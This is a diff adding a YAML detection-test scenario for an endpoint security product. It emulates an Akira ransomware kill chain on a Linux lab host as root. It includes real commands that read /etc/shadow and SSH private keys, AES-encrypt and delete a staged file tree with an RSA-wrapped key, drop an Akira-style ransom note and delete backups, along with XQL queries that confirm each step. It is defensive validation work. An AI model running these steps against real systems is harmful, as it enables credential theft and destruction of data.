@@ -1,0 +1,427 @@
+scenario_id: SIM-EDR-025
+name: "Akira (Howling Scorpius) Linux-Host Kill Chain — Defense Evasion, Shadow/Key Theft, Staging and Real On-Host File Encryption"
+version: "1.0"
+status: active
+
+plane: EDR
+# Two agent-raised detections are the headline (the ABIOC on the shadow read and
+# the anti-ransomware Prevention verdict on the encryption). The other four steps
+# declare a Tier-2-verify XQL row that CONFIRMS that step's own telemetry exists
+# (the SIM-EDR-023 shape): these are scored only by POST /api/runs/{id}/verify
+# (1 h lookback), NOT by the report-mode agent-detection pass, so they cannot
+# manufacture a false agent-detection miss on a healthy tenant. The
+# host-mass-encryption BIOCs, hunt XQL and Akira IOCs stay on card TTP-2026-0200
+# as hunt/undeclared content because the lab tenant has 0 queryable custom BIOCs
+# and a declared-but-unfirable rule would score a working tenant as a MISS.
+detection_types:
+  - ABIOC
+  - Prevention
+  - XQL
+
+# ── UC/TC Alignment ─────────────────────────────────────────────────────────
+uc_ref: UCS-EDR-02
+tc_ref: TC-EDR-04
+tc_refs:
+  - TC-EDR-04
+  - TC-EDR-03
+  - TC-EDR-05
+pov_scenario_id: POV-SC-021
+uc_name: "Endpoint Detection & Response"
+tc_name: "Demonstrate auto-containment triggers on confirmed malware execution"
+
+mitre_tactic: "TA0040"
+mitre_tactic_name: "Impact"
+mitre_technique: "T1486"
+mitre_technique_name: "Data Encrypted for Impact"
+additional_techniques:
+  - technique: "T1562.001"
+    name: "Impair Defenses: Disable or Modify Tools"
+  - technique: "T1070.002"
+    name: "Indicator Removal: Clear Linux or Mac System Logs"
+  - technique: "T1003.008"
+    name: "OS Credential Dumping: /etc/passwd and /etc/shadow"
+  - technique: "T1552.004"
+    name: "Unsecured Credentials: Private Keys"
+  - technique: "T1083"
+    name: "File and Directory Discovery"
+  - technique: "T1560.001"
+    name: "Archive Collected Data: Archive via Utility"
+  - technique: "T1490"
+    name: "Inhibit System Recovery"
+
+threat_report: "Threat Assessment: Howling Scorpius (Akira Ransomware)"
+threat_report_url: "https://unit42.paloaltonetworks.com/threat-assessment-howling-scorpius-akira-ransomware/"
+
+# ── Causality contract ──────────────────────────────────────────────────────
+# Akira's Linux/ESXi operators land through a stolen, valid remote session
+# (Unit 42 Howling Scorpius: SonicWall SSL-VPN / exposed RDP) and run the whole
+# chain hands-on-keyboard as root. cgo_anchor roots SimCore's causality graph
+# at sshd and names the root operator shell; it labels SimCore's own graph and
+# does NOT change what the tenant records as the CGO. On pov-target-01 every
+# beacon-run step carries causality_actor_process_image_name = cortexsim-agent,
+# so the per-step process_lineage spine (step-01 -> ... -> step-06) is the
+# honest in-engine lineage the POV report walks back to the CGO.
+cgo_anchor:
+  image_name: "sshd"
+  primary_username: "root"
+
+# Every step runs as root/direct. The lab VM (pov-target-01) has NO service
+# accounts provisioned (no www-data / svc-backup), and Akira's Linux operators
+# run as root after session theft, so direct root is both faithful and the only
+# identity the harness can honour here.
+execution_identity:
+  default: root
+  options:
+    - root
+
+# Push is supported: unlike the persistence scenarios (SIM-EDR-023/024) this
+# chain has NO deferred re-execution — the encryption and the agent's
+# anti-ransomware verdict are produced synchronously inside step-05, so a
+# bundle's `trap cleanup EXIT` runs only AFTER every step and every detection
+# event has already been emitted. The tools used (openssl, tar, findmnt,
+# systemctl, chattr) are all present on a clean Ubuntu 22.04 base.
+push_supported: true
+pull_supported: true
+
+infra_modules_needed:
+  - base
+  - edr
+
+# ── v2.0 KPI / Methodology Metadata ─────────────────────────────────────────
+validation_methodology: "Signal Injection & Detection Accuracy"
+methodology_family: "F1"
+primary_kpi: "Detection Accuracy"
+threshold:
+  kpi: "Detection Accuracy"
+  op: "≥"
+  value: 80
+  unit: "%"
+success_criteria: |
+  This is the on-host Linux variant of Akira (Howling Scorpius), distinct from
+  SIM-EDR-019 (vCenter->ESXi hypervisor path) and from SIM-EDR-008 (which is
+  SAFE-MODE and never encrypts). Here the encryptor REALLY encrypts a synthetic
+  victim tree under /var/tmp/.cortexsim-akira with openssl AES-256-CBC, wraps
+  the AES key with a generated RSA public key (Akira's hybrid scheme), appends
+  the real .akira extension and drops the real akira_readme.txt note. No real
+  user data is ever touched; cleanup fully removes the tree, the .akira files,
+  the notes and the decoy service.
+  Two agent-raised detections are the headline (the tenant shows 0 queryable
+  custom BIOCs, so grouping rests on Medium+ runtime verdicts, not hand-authored
+  rules):
+    1. step-05 Prevention — the agent's anti-ransomware / behavioural-threat
+       module raises a Medium+ verdict on the real mass-encryption. Declared
+       with outcome: detect, so report mode scores it detected; a block-mode
+       paired run would instead grade the kill (two witnesses).
+    2. step-02 ABIOC — the built-in "Suspicious access to shadow file" XDR
+       Analytics BIOC (Low) on the real /etc/shadow read. Proven on this lab
+       2026-11-11 (issues 1500417/1500418 on useradd/chpasswd); here the actor
+       is `cat`, a distinct unpopular reader of /etc/shadow.
+  The other four steps (01 defense evasion, 03 discovery, 04 staging, 06 recovery
+  inhibition) each declare ONE XQL row that only CONFIRMS that step's own
+  telemetry exists. These are scored solely by Tier-2 verify
+  (POST /api/runs/{id}/verify, 1 h lookback) — never by the report-mode
+  agent-detection pass — so they cannot manufacture a false agent-detection miss
+  on a healthy tenant. Run verify within the hour or they read pending, not fail.
+  PASS: at least 80% of the six declared step-detections are observed. The two
+  agent detections are load-bearing; the anti-ransomware verdict is the one that
+  should carry a case. Rarity caveat: the shadow-file ABIOC judges rarity and
+  may read missed on a host where that process/file pair is already baselined —
+  the 80% bar tolerates that one miss.
+  tenant-verified: 0 — no run of this scenario has executed against a live
+  Cortex tenant, and no run has ever performed REAL on-host encryption against
+  this agent, so the anti-ransomware verdict in particular is authored, NOT
+  proven. Authored is not proven.
+moat_tier: "LEAD"
+
+steps:
+  - id: step-01
+    name: "Defense evasion — stage an isolated victim tree, disable coredumps, truncate staged log copies, stop a decoy service"
+    # Faithful to Akira's Linux/ESXi defense evasion (Unit 42): on ESXi the
+    # operators redirect syslog to /tmp and unconfigure the coredump file
+    # (`esxcli system syslog config set --logdir=/tmp`, `esxcli system coredump
+    # file set --unconfigure`). The plain-Linux equivalents here all act on
+    # CortexSim-created artefacts only: set the shell's core ulimit to 0,
+    # truncate COPIES of logs staged under the victim tree (never real
+    # /var/log), and stop a decoy service CortexSim itself installed.
+    # Telemetry shape: PROCESS_START of install/truncate/systemctl under the
+    # root operator shell; no built-in detection is expected on staged copies.
+    command: |
+      set -eu
+      D=/var/tmp/.cortexsim-akira
+      rm -rf "$D"
+      mkdir -p "$D/company-share/finance" "$D/company-share/hr" "$D/log" "$D/backup"
+      chmod -R 700 "$D"
+      # Synthetic "company" documents — the only data this scenario ever touches.
+      for i in $(seq 1 20); do
+        echo "SYNTHETIC CortexSim finance record $i $(date -u +%FT%TZ)" > "$D/company-share/finance/invoice_$i.dat"
+        echo "SYNTHETIC CortexSim hr record $i" > "$D/company-share/hr/employee_$i.dat"
+      done
+      # Decoy backups (recovery-inhibition targets in step-06) and decoy log copies.
+      for i in 1 2 3; do echo "SYNTHETIC backup $i" > "$D/backup/snapshot_$i.img"; done
+      for n in auth syslog cron; do echo "SYNTHETIC staged $n log line" > "$D/log/$n.log"; done
+      # A decoy service CortexSim owns, so stopping it touches nothing real.
+      cat > /etc/systemd/system/cortexsim-decoy.service <<'EOF'
+      [Unit]
+      Description=CortexSim SIM-EDR-025 decoy service (lab artefact)
+      [Service]
+      Type=oneshot
+      ExecStart=/bin/true
+      RemainAfterExit=yes
+      [Install]
+      WantedBy=multi-user.target
+      EOF
+      systemctl daemon-reload
+      systemctl enable --now cortexsim-decoy.service >/dev/null 2>&1 || true
+      # Defense evasion proper, on staged artefacts only:
+      ulimit -c 0
+      : > "$D/log/auth.log"; : > "$D/log/syslog"; : > "$D/log/cron.log" 2>/dev/null || true
+      systemctl stop cortexsim-decoy.service >/dev/null 2>&1 || true
+      echo "[CortexSim] SIM-EDR-025 step-01: victim tree staged, coredumps off, staged logs cleared, decoy service stopped"
+    identity: root
+    mitre_technique: "T1562.001"
+    platforms: ["linux"]
+    # No agent-raised built-in fires on defense evasion of CortexSim-staged copies
+    # (never real /var/log). Declared row is a Tier-2-verify telemetry validation.
+    expected_detections:
+      - plane: EDR
+        type: XQL
+        description: "Validation (Tier-2 verify, 1 h lookback) — the decoy service is stopped by systemctl under the operator shell; defense-evasion telemetry, not an agent alert."
+        ttp_ref: "TTP-2026-0200"
+        verification_xql: |
+          dataset = xdr_data
+          | filter timestamp_diff(current_time(), _time, "SECOND") < 3600
+          | filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
+          | filter action_process_image_name = "systemctl"
+          | filter action_process_image_command_line contains "cortexsim-decoy"
+          | fields _time, agent_hostname, actor_causality_id, action_process_image_command_line
+
+  - id: step-02
+    name: "Credential access — read /etc/shadow and any SSH private keys"
+    # Akira Linux credential access (Unit 42): harvest local secrets before
+    # impact. REAL read-only access — nothing is copied off the host. Reading
+    # /etc/shadow with an unpopular process is exactly what raises the built-in
+    # "Suspicious access to shadow file" ABIOC (proven on this lab 2026-11-11
+    # on useradd/chpasswd; here the reader is `cat`). The dwell matches the
+    # persistence scenarios: back-to-back steps lost telemetry in this lab.
+    command: |
+      set -eu
+      sleep 40
+      echo "[CortexSim] SIM-EDR-025 step-02: reading /etc/shadow (hash lengths only, no secrets printed)"
+      cat /etc/shadow | awk -F: '{print $1": hash_len="length($2)}' | head -n 5
+      # Enumerate and read any SSH private keys present, read-only. Redirect the
+      # key bytes to /dev/null: the telemetry (FILE_OPEN of id_* by cat) is the
+      # point, not the key material.
+      for k in /root/.ssh/id_* /home/*/.ssh/id_* /etc/ssh/ssh_host_*_key; do
+        [ -f "$k" ] || continue
+        case "$k" in *.pub) continue;; esac
+        echo "[CortexSim] reading private key $k (bytes -> /dev/null)"
+        cat "$k" > /dev/null 2>&1 || true
+      done
+    identity: root
+    mitre_technique: "T1003.008"
+    platforms: ["linux"]
+    causality:
+      parent_step: step-01
+      pivot: process_lineage
+    expected_detections:
+      - plane: EDR
+        type: ABIOC
+        description: "Built-in XDR Analytics BIOC (Low, no case): an unpopular process (cat) opens /etc/shadow — the same built-in detector observed on this endpoint 2026-11-11 on useradd/chpasswd (issues 1500417/1500418). Rarity-judged: may read missed if this process/file pair is already baselined."
+        ttp_ref: "TTP-2026-0200"
+        detection_id: abioc-suspicious-access-to-shadow-file
+
+  - id: step-03
+    name: "Discovery — enumerate mounts and the files to encrypt"
+    # Akira Linux discovery (Unit 42): the encryptor walks the filesystem and
+    # mount table to build its target list and can be pointed at specific paths
+    # (`--encryption_path`). Here it enumerates mounts and builds the target
+    # list from the staged company share only.
+    command: |
+      set -eu
+      sleep 40
+      D=/var/tmp/.cortexsim-akira
+      { findmnt -rno TARGET 2>/dev/null || mount; } | head -n 20
+      df -hP "$D" 2>/dev/null | tail -n +1
+      find "$D/company-share" -type f > "$D/targets.list"
+      echo "[CortexSim] SIM-EDR-025 step-03: $(wc -l < "$D/targets.list") files enumerated for encryption"
+    identity: root
+    mitre_technique: "T1083"
+    platforms: ["linux"]
+    causality:
+      parent_step: step-02
+      pivot: process_lineage
+    # No agent-raised built-in fires on enumeration; declared row is a
+    # Tier-2-verify telemetry validation that provides the impact's causality.
+    expected_detections:
+      - plane: EDR
+        type: XQL
+        description: "Validation (Tier-2 verify, 1 h lookback) — pre-impact filesystem/mount discovery (findmnt/df/find) under the operator causality chain."
+        ttp_ref: "TTP-2026-0200"
+        verification_xql: |
+          dataset = xdr_data
+          | filter timestamp_diff(current_time(), _time, "SECOND") < 3600
+          | filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
+          | filter action_process_image_name in ("findmnt", "df", "find")
+          | fields _time, agent_hostname, actor_causality_id, action_process_image_name, action_process_image_command_line
+
+  - id: step-04
+    name: "Collection / exfil staging (double extortion) — local archive only"
+    # Akira's double-extortion steals data before encrypting (Unit 42 reports
+    # rclone / WinSCP / FTP to attacker infrastructure). The lab NEVER exfils to
+    # an external host: it only archives the staged company share into a local
+    # tarball under the victim tree, producing the collection/archive telemetry
+    # shape without egress.
+    command: |
+      set -eu
+      sleep 40
+      D=/var/tmp/.cortexsim-akira
+      tar -czf "$D/exfil-staged.tar.gz" -C "$D" company-share
+      ls -la "$D/exfil-staged.tar.gz"
+      echo "[CortexSim] SIM-EDR-025 step-04: company share archived locally (NO external exfiltration)"
+    identity: root
+    mitre_technique: "T1560.001"
+    platforms: ["linux"]
+    causality:
+      parent_step: step-03
+      pivot: process_lineage
+    # No agent-raised built-in fires on an egress-less local archive; declared
+    # row is a Tier-2-verify telemetry validation of the collection/staging.
+    expected_detections:
+      - plane: EDR
+        type: XQL
+        description: "Validation (Tier-2 verify, 1 h lookback) — the staged company share is archived locally with tar (double-extortion staging, no external exfiltration)."
+        ttp_ref: "TTP-2026-0200"
+        verification_xql: |
+          dataset = xdr_data
+          | filter timestamp_diff(current_time(), _time, "SECOND") < 3600
+          | filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
+          | filter action_process_image_name = "tar"
+          | filter action_process_image_command_line contains "exfil-staged.tar.gz"
+          | fields _time, agent_hostname, actor_causality_id, action_process_image_command_line
+
+  - id: step-05
+    name: "Impact — real AES-256 encryption of the staged tree with an RSA-wrapped key, .akira extension and ransom note"
+    # Akira's Linux encryptor (Unit 42): per-file symmetric encryption (AES /
+    # CAMELLIA / etc.) with the symmetric key RSA-wrapped, a uniform extension
+    # appended, and a ransom note dropped in each directory. This step does the
+    # REAL hybrid-crypto fingerprint against the synthetic staged files ONLY:
+    # generate an RSA keypair and a random AES key, AES-256-CBC-encrypt each
+    # staged file to <file>.akira, remove the plaintext, RSA-wrap the AES key
+    # into akira_wrapped.key and destroy the plaintext AES key, then drop the
+    # real akira_readme.txt note in every directory. This rapid mass-rewrite-
+    # with-uniform-extension-plus-note behaviour is what the agent's
+    # anti-ransomware / behavioural-threat module scores Medium+ — that verdict
+    # is the declared detection. Not masked: the step exits non-zero if the
+    # encryption loop fails, and the agent killing the encryptor (block mode)
+    # surfaces as a signal, never a swallowed error.
+    command: |
+      set -eu
+      sleep 40
+      D=/var/tmp/.cortexsim-akira
+      KEYDIR="$D/.keys"
+      mkdir -p "$KEYDIR"; chmod 700 "$KEYDIR"
+      # Attacker RSA keypair + random AES key (Akira hybrid scheme).
+      openssl genrsa -out "$KEYDIR/attacker_rsa.key" 2048 >/dev/null 2>&1
+      openssl rsa -in "$KEYDIR/attacker_rsa.key" -pubout -out "$KEYDIR/attacker_rsa.pub" >/dev/null 2>&1
+      AESKEY="$(openssl rand -hex 32)"
+      count=0
+      while IFS= read -r f; do
+        [ -f "$f" ] || continue
+        openssl enc -aes-256-cbc -pbkdf2 -salt -in "$f" -out "$f.akira" -pass "pass:$AESKEY"
+        rm -f "$f"
+        count=$((count + 1))
+      done < "$D/targets.list"
+      # RSA-wrap the AES key, then destroy the plaintext key (only the wrapped
+      # form remains — the hybrid fingerprint).
+      printf '%s' "$AESKEY" | openssl pkeyutl -encrypt -pubin -inkey "$KEYDIR/attacker_rsa.pub" \
+        -out "$D/akira_wrapped.key" 2>/dev/null || \
+      printf '%s' "$AESKEY" | openssl rsautl -encrypt -pubin -inkey "$KEYDIR/attacker_rsa.pub" \
+        -out "$D/akira_wrapped.key"
+      unset AESKEY
+      # Real Akira ransom note in every directory holding encrypted files.
+      NOTE='Hi friends.
+
+      Whatever who you are and what your title is if you are reading this it means the internal infrastructure of your company is fully or partially dead... (CortexSim SIM-EDR-025 synthetic note — no real data was encrypted; lab artefact)'
+      for dir in $(find "$D/company-share" -type d); do
+        printf '%s\n' "$NOTE" > "$dir/akira_readme.txt"
+      done
+      printf '%s\n' "$NOTE" > "$D/company-share/akira_readme.txt"
+      echo "[CortexSim] SIM-EDR-025 step-05: $count files encrypted to *.akira, AES key RSA-wrapped, akira_readme.txt dropped"
+      [ "$count" -gt 0 ] || { echo "[CortexSim] encryption loop produced 0 files" >&2; exit 1; }
+    identity: root
+    mitre_technique: "T1486"
+    platforms: ["linux"]
+    causality:
+      parent_step: step-04
+      pivot: process_lineage
+    expected_detections:
+      - plane: EDR
+        type: Prevention
+        # outcome: detect -> report mode scores it detected (no two-witness
+        # requirement, no S-21 masking constraint). A block-mode paired run on
+        # the same endpoint would instead grade the agent's kill of the
+        # encryptor. btp is the module (Linux has no Ransomware Protection
+        # module; Global BTP Rules stop encryption there); the alert-name pattern is
+        # authored, NOT lab-proven — no real on-host encryption has run against
+        # this agent, so this verdict is the scenario's headline unproven claim.
+        outcome: detect
+        description: "Agent anti-ransomware / behavioural-threat verdict (Medium+) on the real AES mass-encryption with uniform .akira extension and ransom-note drop. Scored detected in report mode; the case seed. Authored, not yet observed in the lab."
+        ttp_ref: "TTP-2026-0200"
+        detection_id: prevention-anti-ransomware-mass-encryption
+
+  - id: step-06
+    name: "Inhibit recovery — delete the staged backup copies and disable the decoy service"
+    # Akira Linux recovery inhibition (Unit 42): destroy backups/snapshots so
+    # victims cannot restore. Here it deletes ONLY the CortexSim-staged backup
+    # files under the victim tree and disables the decoy service CortexSim
+    # installed — no real backup, snapshot or service is touched.
+    command: |
+      set -eu
+      sleep 40
+      D=/var/tmp/.cortexsim-akira
+      rm -f "$D"/backup/snapshot_*.img
+      systemctl disable --now cortexsim-decoy.service >/dev/null 2>&1 || true
+      echo "[CortexSim] SIM-EDR-025 step-06: staged backups deleted, decoy service disabled (CortexSim artefacts only)"
+    identity: root
+    mitre_technique: "T1490"
+    platforms: ["linux"]
+    causality:
+      parent_step: step-05
+      pivot: process_lineage
+    # No agent-raised built-in fires on deleting CortexSim-staged backups; declared
+    # row is a Tier-2-verify telemetry validation. CR-EDR-0025 (card, not declared)
+    # fuses this leg with the encryption for hunting if a DC installs it.
+    expected_detections:
+      - plane: EDR
+        type: XQL
+        description: "Validation (Tier-2 verify, 1 h lookback) — staged backup copies are deleted (recovery inhibition) in the same causality chain as the encryption."
+        ttp_ref: "TTP-2026-0200"
+        verification_xql: |
+          dataset = xdr_data
+          | filter timestamp_diff(current_time(), _time, "SECOND") < 3600
+          | filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
+          | filter action_process_image_name = "rm"
+          | filter action_process_image_command_line contains "/var/tmp/.cortexsim-akira/backup/"
+          | fields _time, agent_hostname, actor_causality_id, action_process_image_command_line
+
+cleanup:
+  commands:
+    - "systemctl disable --now cortexsim-decoy.service >/dev/null 2>&1 || true"
+    - "rm -f /etc/systemd/system/cortexsim-decoy.service"
+    - "systemctl daemon-reload >/dev/null 2>&1 || true"
+    - "rm -rf /var/tmp/.cortexsim-akira"
+    - "echo 'cortexsim-edr-025-cleanup-complete'"
+
+author: "Henry Reed"
+created: "2026-11-11"
+last_updated: "2026-11-11"
+tags:
+  - edr
+  - linux
+  - ransomware
+  - akira
+  - howling-scorpius
+  - data-encrypted-for-impact
+  - inhibit-recovery
+  - real-encryption
+  - long-dwell
